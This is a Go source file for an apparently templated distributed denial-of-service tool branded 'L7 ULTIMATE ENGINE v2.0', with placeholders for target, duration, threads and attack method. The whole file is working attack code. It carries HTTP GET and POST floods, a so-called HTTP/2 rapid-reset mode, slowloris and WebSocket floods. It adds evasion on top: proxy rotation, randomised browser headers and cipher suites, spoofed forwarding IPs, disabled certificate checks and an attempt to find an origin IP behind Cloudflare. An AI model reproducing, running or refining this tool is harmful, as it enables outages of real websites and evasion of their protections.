package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/httptrace"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/net/http2"
	"golang.org/x/net/proxy"
)

// ==================== TEMPLATE VARIABLES ====================
var (
	targetURL = "{{.TargetURL}}"
	duration  = "{{.Duration}}"
	threads   = "{{.Threads}}"
	method    = "{{.Method}}"
)

// ==================== KONSTANTA ====================
const (
	MAX_CONCURRENT_CONNS = 1000
	MAX_RETRIES          = 3
	SOCKET_BUF_SIZE      = 16 * 1024 * 1024
)

// ==================== CONFIGURATION ====================
type Config struct {
	threadCount   int
	durationSec   int
	attackMethod  string
	useProxy      bool
	proxyList     []string
	proxyIndex    uint64
	randomAgent   bool
	randomHeaders bool
	useHTTP2      bool
	rapidReset    bool
	slowloris     bool
	websocket     bool
	originIP      string
	originalURL   string
}

var cfg Config

var (
	totalRequests uint64
	totalBytes    uint64
	startTime     time.Time
	stopTime      time.Time
)

// ==================== USER AGENTS & HEADERS ====================
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
}

var referers = []string{
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://www.yahoo.com/",
	"https://www.facebook.com/",
	"https://twitter.com/",
	"https://www.instagram.com/",
	"https://www.youtube.com/",
	"https://www.reddit.com/",
	"https://github.com/",
	"https://stackoverflow.com/",
}

var acceptHeaders = []string{
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/svg+xml,*/*;q=0.8",
}

var acceptLanguages = []string{
	"en-US,en;q=0.9",
	"en-GB,en;q=0.9",
	"id-ID,id;q=0.9,en;q=0.8",
	"zh-CN,zh;q=0.9,en;q=0.8",
	"ja-JP,ja;q=0.9,en;q=0.8",
}

var acceptEncodings = []string{
	"gzip, deflate, br",
	"gzip, deflate",
	"gzip, br",
	"deflate, br",
}

var secChUa = []string{
	`"Chromium";v="120", "Google Chrome";v="120", "Not?A_Brand";v="99"`,
	`"Chromium";v="119", "Google Chrome";v="119", "Not?A_Brand";v="99"`,
	`"Firefox";v="121", "Gecko";v="121"`,
	`"Microsoft Edge";v="119", "Chromium";v="119"`,
}

// ==================== PROXY ====================
func loadProxies(filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if !strings.Contains(line, "://") {
			line = "http://" + line
		}
		cfg.proxyList = append(cfg.proxyList, line)
	}
	if len(cfg.proxyList) == 0 {
		return fmt.Errorf("no valid proxies found")
	}
	fmt.Printf("[+] Loaded %d proxies\n", len(cfg.proxyList))
	return nil
}

func getNextProxy() string {
	if len(cfg.proxyList) == 0 {
		return ""
	}
	idx := atomic.AddUint64(&cfg.proxyIndex, 1) % uint64(len(cfg.proxyList))
	return cfg.proxyList[idx]
}

func createTransportWithProxy() *http.Transport {
	transport := &http.Transport{
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		MaxConnsPerHost:     0,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   false,
		DisableCompression:  false,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites:       getRandomCipherSuites(),
			CurvePreferences:   []tls.CurveID{tls.CurveP256, tls.CurveP384, tls.X25519},
		},
	}
	if cfg.useProxy {
		proxyURL := getNextProxy()
		if proxyURL != "" {
			proxy, err := url.Parse(proxyURL)
			if err == nil {
				transport.Proxy = http.ProxyURL(proxy)
			}
		}
	}
	return transport
}

func getRandomCipherSuites() []uint16 {
	ciphers := []uint16{
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_AES_128_GCM_SHA256,
		tls.TLS_AES_256_GCM_SHA384,
		tls.TLS_CHACHA20_POLY1305_SHA256,
	}
	rand.Shuffle(len(ciphers), func(i, j int) { ciphers[i], ciphers[j] = ciphers[j], ciphers[i] })
	count := 3 + rand.Intn(3)
	if count > len(ciphers) {
		count = len(ciphers)
	}
	return ciphers[:count]
}

// ==================== CLOUDFLARE BYPASS ====================
func discoverOriginIP(targetURL string) string {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return ""
	}
	host := parsed.Hostname()
	ips, err := net.LookupIP(host)
	if err != nil {
		return ""
	}
	for _, ip := range ips {
		if isCloudflareIP(ip) {
			continue
		}
		return ip.String()
	}
	if len(ips) > 0 {
		return ips[0].String()
	}
	return ""
}

func isCloudflareIP(ip net.IP) bool {
	cloudflareRanges := []string{
		"173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
		"141.101.64.0/18", "108.162.192.0/18", "190.93.240.0/20", "188.114.96.0/20",
		"197.234.240.0/22", "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
		"104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22",
	}
	for _, cidr := range cloudflareRanges {
		_, ipnet, _ := net.ParseCIDR(cidr)
		if ipnet.Contains(ip) {
			return true
		}
	}
	return false
}

// ==================== REQUEST BUILDER ====================
func buildRequest(targetURL string, method string) (*http.Request, error) {
	req, err := http.NewRequest(method, targetURL, nil)
	if err != nil {
		return nil, err
	}
	ua := userAgents[rand.Intn(len(userAgents))]
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Referer", referers[rand.Intn(len(referers))])
	req.Header.Set("Accept", acceptHeaders[rand.Intn(len(acceptHeaders))])
	req.Header.Set("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
	req.Header.Set("Accept-Encoding", acceptEncodings[rand.Intn(len(acceptEncodings))])
	cacheControls := []string{"no-cache", "max-age=0", "no-store", "must-revalidate"}
	req.Header.Set("Cache-Control", cacheControls[rand.Intn(len(cacheControls))])
	connections := []string{"keep-alive", "close", "upgrade"}
	req.Header.Set("Connection", connections[rand.Intn(len(connections))])
	if rand.Intn(2) == 0 {
		secUa := secChUa[rand.Intn(len(secChUa))]
		req.Header.Set("Sec-Ch-Ua", secUa)
		req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
		req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
		req.Header.Set("Sec-Fetch-Dest", "document")
		req.Header.Set("Sec-Fetch-Mode", "navigate")
		req.Header.Set("Sec-Fetch-Site", "none")
		req.Header.Set("Sec-Fetch-User", "?1")
	}
	if rand.Intn(2) == 0 {
		req.Header.Set("DNT", "1")
	}
	if rand.Intn(3) == 0 {
		randomHeaders := []string{
			"X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
			"X-Remote-IP", "X-Remote-Addr", "X-Client-IP",
		}
		randomIP := generateRandomIP()
		req.Header.Set(randomHeaders[rand.Intn(len(randomHeaders))], randomIP)
	}
	if rand.Intn(2) == 0 {
		cookie := fmt.Sprintf("_ga=GA1.2.%d; _gid=GA1.2.%d; session=%s",
			rand.Int63(), rand.Int63(), generateRandomString(32))
		req.Header.Set("Cookie", cookie)
	}
	if cfg.originIP != "" {
		u, _ := url.Parse(cfg.originalURL)
		req.Host = u.Host
	}
	return req, nil
}

func generateRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
}

func generateRandomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// ==================== ATTACK FUNCTIONS ====================
func httpFloodAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, workerID int) {
	defer wg.Done()
	client := &http.Client{
		Transport: createTransportWithProxy(),
		Timeout:   30 * time.Second,
	}
	for time.Now().Before(stopTime) {
		select {
		case <-ctx.Done():
			return
		default:
		}
		req, err := buildRequest(targetURL, "GET")
		if err != nil {
			atomic.AddUint64(&totalRequests, 1)
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			// Print error once per worker to stderr (visible in SSH output)
			if atomic.AddUint64(&totalRequests, 1) == 1 {
				fmt.Fprintf(os.Stderr, "[!] Worker %d: %v\n", workerID, err)
			}
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		atomic.AddUint64(&totalBytes, uint64(len(body)))
		resp.Body.Close()
		atomic.AddUint64(&totalRequests, 1)
		time.Sleep(time.Millisecond * time.Duration(rand.Intn(5)))
	}
}

func rapidResetAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, workerID int) {
	defer wg.Done()
	parsedURL, _ := url.Parse(targetURL)
	host := parsedURL.Host
	if !strings.Contains(host, ":") {
		if parsedURL.Scheme == "https" {
			host = host + ":443"
		} else {
			host = host + ":80"
		}
	}
	transport := &http2.Transport{
		AllowHTTP: false,
		DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
			cfg.InsecureSkipVerify = true
			cfg.NextProtos = []string{"h2", "http/1.1"}
			return tls.Dial(network, addr, cfg)
		},
	}
	client := &http.Client{Transport: transport}
	for time.Now().Before(stopTime) {
		select {
		case <-ctx.Done():
			return
		default:
		}
		req, _ := buildRequest(targetURL, "GET")
		if req == nil {
			atomic.AddUint64(&totalRequests, 1)
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			atomic.AddUint64(&totalRequests, 1)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		atomic.AddUint64(&totalRequests, 1)
		time.Sleep(time.Microsecond * time.Duration(100+rand.Intn(500)))
	}
}

func slowlorisAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, workerID int) {
	defer wg.Done()
	parsedURL, _ := url.Parse(targetURL)
	host := parsedURL.Host
	port := "80"
	if parsedURL.Scheme == "https" {
		port = "443"
	}
	if strings.Contains(host, ":") {
		host, port, _ = net.SplitHostPort(host)
	}
	for time.Now().Before(stopTime) {
		select {
		case <-ctx.Done():
			return
		default:
		}
		var conn net.Conn
		var err error
		if cfg.useProxy {
			proxyURL := getNextProxy()
			if proxyURL != "" {
				dialer, err := proxy.FromURL(&url.URL{Scheme: "http", Host: strings.TrimPrefix(proxyURL, "http://")}, proxy.Direct)
				if err == nil {
					conn, err = dialer.Dial("tcp", net.JoinHostPort(host, port))
				}
			}
		} else {
			conn, err = net.DialTimeout("tcp", net.JoinHostPort(host, port), 10*time.Second)
		}
		if err != nil {
			atomic.AddUint64(&totalRequests, 1)
			continue
		}
		request := fmt.Sprintf("GET /%s HTTP/1.1\r\n", generateRandomString(rand.Intn(32)+1))
		request += fmt.Sprintf("Host: %s\r\n", host)
		request += fmt.Sprintf("User-Agent: %s\r\n", userAgents[rand.Intn(len(userAgents))])
		request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
		request += "Accept-Language: en-US,en;q=0.5\r\n"
		request += "Accept-Encoding: gzip, deflate\r\n"
		for i := 0; i < 100; i++ {
			request += fmt.Sprintf("X-Header-%d: %s\r\n", i, generateRandomString(rand.Intn(64)+1))
		}
		conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
		conn.Write([]byte(request))
		ticker := time.NewTicker(10 * time.Second)
		done := make(chan bool)
		go func() {
			for {
				select {
				case <-ticker.C:
					keepAlive := fmt.Sprintf("X-Keep-Alive: %s\r\n", generateRandomString(32))
					conn.Write([]byte(keepAlive))
				case <-done:
					return
				case <-ctx.Done():
					return
				}
			}
		}()
		select {
		case <-time.After(time.Until(stopTime)):
			close(done)
			ticker.Stop()
			conn.Close()
		case <-ctx.Done():
			close(done)
			ticker.Stop()
			conn.Close()
		}
		atomic.AddUint64(&totalRequests, 1)
	}
}

func postFloodAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, workerID int) {
	defer wg.Done()
	client := &http.Client{
		Transport: createTransportWithProxy(),
		Timeout:   30 * time.Second,
	}
	for time.Now().Before(stopTime) {
		select {
		case <-ctx.Done():
			return
		default:
		}
		postData := generateRandomPostData()
		req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer(postData))
		if err != nil {
			atomic.AddUint64(&totalRequests, 1)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
		req.Header.Set("Referer", referers[rand.Intn(len(referers))])
		req.Header.Set("Content-Length", strconv.Itoa(len(postData)))
		resp, err := client.Do(req)
		if err != nil {
			atomic.AddUint64(&totalRequests, 1)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		atomic.AddUint64(&totalRequests, 1)
		atomic.AddUint64(&totalBytes, uint64(len(postData)))
		time.Sleep(time.Millisecond * time.Duration(rand.Intn(10)))
	}
}

func generateRandomPostData() []byte {
	fields := []string{
		"username", "password", "email", "search", "query", "data",
		"token", "id", "action", "command", "value", "input",
	}
	var params []string
	for i := 0; i < rand.Intn(10)+5; i++ {
		field := fields[rand.Intn(len(fields))]
		value := generateRandomString(rand.Intn(100) + 10)
		params = append(params, fmt.Sprintf("%s=%s", field, url.QueryEscape(value)))
	}
	return []byte(strings.Join(params, "&"))
}

func websocketFloodAttack(ctx context.Context, targetURL string, wg *sync.WaitGroup, workerID int) {
	defer wg.Done()
	wsURL := strings.Replace(targetURL, "http://", "ws://", 1)
	wsURL = strings.Replace(wsURL, "https://", "wss://", 1)
	for time.Now().Before(stopTime) {
		select {
		case <-ctx.Done():
			return
		default:
		}
		dialer := &websocket.Dialer{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		if cfg.useProxy {
			proxyURL := getNextProxy()
			if proxyURL != "" {
				proxy, err := url.Parse(proxyURL)
				if err == nil {
					dialer.Proxy = http.ProxyURL(proxy)
				}
			}
		}
		conn, _, err := dialer.Dial(wsURL, nil)
		if err != nil {
			atomic.AddUint64(&totalRequests, 1)
			continue
		}
		go func() {
			ticker := time.NewTicker(100 * time.Millisecond)
			defer ticker.Stop()
			for {
				select {
				case <-ticker.C:
					msg := generateRandomString(rand.Intn(1024) + 64)
					conn.WriteMessage(websocket.TextMessage, []byte(msg))
				case <-ctx.Done():
					return
				}
			}
		}()
		select {
		case <-time.After(time.Until(stopTime)):
			conn.Close()
		case <-ctx.Done():
			conn.Close()
		}
		atomic.AddUint64(&totalRequests, 1)
	}
}

// ==================== INIT ====================
func initConfig() error {
	var err error
	cfg.durationSec, err = strconv.Atoi(duration)
	if err != nil || cfg.durationSec <= 0 {
		cfg.durationSec = 60
	}
	baseThreads, _ := strconv.Atoi(threads)
	if baseThreads <= 0 {
		baseThreads = 500
	}
	cfg.threadCount = baseThreads * runtime.NumCPU()
	cfg.attackMethod = strings.ToUpper(strings.TrimSpace(method))
	if cfg.attackMethod == "" {
		cfg.attackMethod = "GOD_L7"
	}
	if err := loadProxies("proxy.txt"); err == nil {
		cfg.useProxy = true
		fmt.Printf("[+] Proxy mode enabled with %d proxies\n", len(cfg.proxyList))
	} else {
		fmt.Printf("[!] No proxy file found, continuing without proxies\n")
		cfg.useProxy = false
	}
	// Simpan original URL
	cfg.originalURL = targetURL
	originIP := discoverOriginIP(targetURL)
	if originIP != "" {
		fmt.Printf("[+] Discovered potential origin IP: %s\n", originIP)
		cfg.originIP = originIP
		parsed, _ := url.Parse(targetURL)
		if parsed != nil {
			hostPort := parsed.Host
			if strings.Contains(hostPort, ":") {
				hostPort = originIP + ":" + strings.Split(hostPort, ":")[1]
			} else {
				hostPort = originIP
			}
			targetURL = parsed.Scheme + "://" + hostPort
			fmt.Printf("[+] Updated target to origin IP: %s\n", targetURL)
		}
	} else {
		fmt.Printf("[!] Could not discover origin IP, using original domain\n")
	}
	// Test connectivity before starting
	fmt.Printf("[*] Testing connectivity to %s ...\n", targetURL)
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(targetURL)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] WARNING: Initial connection test failed: %v\n", err)
		fmt.Fprintf(os.Stderr, "[!] Attack may still work, but errors are expected.\n")
	} else {
		resp.Body.Close()
		fmt.Printf("[+] Connectivity OK (HTTP %d)\n", resp.StatusCode)
	}
	switch cfg.attackMethod {
	case "HTTP_FLOOD":
		cfg.randomAgent = true
		cfg.randomHeaders = true
	case "HTTP2_RAPID":
		cfg.useHTTP2 = true
		cfg.rapidReset = true
	case "SLOWLORIS":
		cfg.slowloris = true
	case "WEBSOCKET":
		cfg.websocket = true
	case "GOD_L7":
		cfg.randomAgent = true
		cfg.randomHeaders = true
		cfg.useHTTP2 = true
		cfg.rapidReset = true
		cfg.slowloris = true
		cfg.websocket = true
	}
	startTime = time.Now()
	stopTime = startTime.Add(time.Duration(cfg.durationSec) * time.Second)
	return nil
}

// ==================== MAIN ====================
func main() {
	if err := initConfig(); err != nil {
		fmt.Fprintf(os.Stderr, "Init error: %v\n", err)
		os.Exit(1)
	}
	printBanner()
	var wg sync.WaitGroup
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	threadsPerMethod := cfg.threadCount / 4
	if threadsPerMethod < 1 {
		threadsPerMethod = 1
	}
	switch cfg.attackMethod {
	case "GOD_L7":
		for i := 0; i < threadsPerMethod; i++ {
			wg.Add(1)
			go httpFloodAttack(ctx, targetURL, &wg, i)
		}
		for i := 0; i < threadsPerMethod; i++ {
			wg.Add(1)
			go rapidResetAttack(ctx, targetURL, &wg, i+threadsPerMethod)
		}
		for i := 0; i < threadsPerMethod; i++ {
			wg.Add(1)
			go slowlorisAttack(ctx, targetURL, &wg, i+threadsPerMethod*2)
		}
		for i := 0; i < threadsPerMethod; i++ {
			wg.Add(1)
			go postFloodAttack(ctx, targetURL, &wg, i+threadsPerMethod*3)
		}
		if cfg.websocket {
			for i := 0; i < threadsPerMethod; i++ {
				wg.Add(1)
				go websocketFloodAttack(ctx, targetURL, &wg, i+threadsPerMethod*4)
			}
		}
	case "HTTP_FLOOD":
		for i := 0; i < cfg.threadCount; i++ {
			wg.Add(1)
			go httpFloodAttack(ctx, targetURL, &wg, i)
		}
	case "HTTP2_RAPID":
		for i := 0; i < cfg.threadCount; i++ {
			wg.Add(1)
			go rapidResetAttack(ctx, targetURL, &wg, i)
		}
	case "SLOWLORIS":
		for i := 0; i < cfg.threadCount; i++ {
			wg.Add(1)
			go slowlorisAttack(ctx, targetURL, &wg, i)
		}
	case "WEBSOCKET":
		for i := 0; i < cfg.threadCount; i++ {
			wg.Add(1)
			go websocketFloodAttack(ctx, targetURL, &wg, i)
		}
	default:
		for i := 0; i < cfg.threadCount; i++ {
			wg.Add(1)
			go httpFloodAttack(ctx, targetURL, &wg, i)
		}
	}
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		for {
			select {
			case <-ticker.C:
				elapsed := time.Since(startTime).Seconds()
				reqs := atomic.LoadUint64(&totalRequests)
				bytes := atomic.LoadUint64(&totalBytes)
				rps := float64(reqs) / elapsed
				mbps := (float64(bytes) * 8.0) / (elapsed * 1024 * 1024)
				fmt.Printf("\r⏳ %.0fs | RPS: %.0f | MBPS: %.1f | Requests: %s",
					elapsed, rps, mbps, formatNum(reqs))
			case <-ctx.Done():
				return
			}
		}
	}()
	wg.Wait()
	cancel()
	printFinalStats()
}

func printBanner() {
	fmt.Printf("\n")
	fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║         L7 ULTIMATE ENGINE v2.0 - CLOUDFLARE BYPASS + ORIGIN DISCOVERY       ║\n")
	fmt.Printf("║                    PROXY ROTATION + HTTP/2 RAPID RESET                        ║\n")
	fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║ Target: %-50s ║\n", targetURL)
	fmt.Printf("║ Duration: %-20ds Method: %-20s                   ║\n", cfg.durationSec, cfg.attackMethod)
	fmt.Printf("║ Threads: %-20d Proxies: %-10d                          ║\n", cfg.threadCount, len(cfg.proxyList))
	fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════╝\n")
	fmt.Printf("\n")
}

func printFinalStats() {
	reqs := atomic.LoadUint64(&totalRequests)
	bytes := atomic.LoadUint64(&totalBytes)
	dur := uint64(cfg.durationSec)
	fmt.Printf("\n\n")
	fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║                           FINAL L7 STATISTICS                                 ║\n")
	fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║  📦 TOTAL REQUESTS:   %-20s                                   ║\n", formatNum(reqs))
	fmt.Printf("║  📊 TOTAL DATA:       %-10.2f MB (%-6.2f GB)                           ║\n",
		float64(bytes)/(1024*1024), float64(bytes)/(1024*1024*1024))
	fmt.Printf("║  ⚡ AVERAGE RPS:      %-20s                                   ║\n", formatNum(reqs/dur))
	fmt.Printf("║  🌐 AVERAGE MBPS:     %-10.2f                                   ║\n",
		(float64(bytes*8)/float64(dur))/(1024*1024))
	fmt.Printf("║  💀 AVERAGE GBPS:     %-10.2f                                   ║\n",
		(float64(bytes*8)/float64(dur))/(1024*1024*1024))
	fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════╝\n")
}

func formatNum(n uint64) string {
	if n < 1000 {
		return fmt.Sprintf("%d", n)
	}
	if n < 1000000 {
		return fmt.Sprintf("%.1fK", float64(n)/1000)
	}
	if n < 1000000000 {
		return fmt.Sprintf("%.1fM", float64(n)/1000000)
	}
	return fmt.Sprintf("%.1fB", float64(n)/1000000000)
}
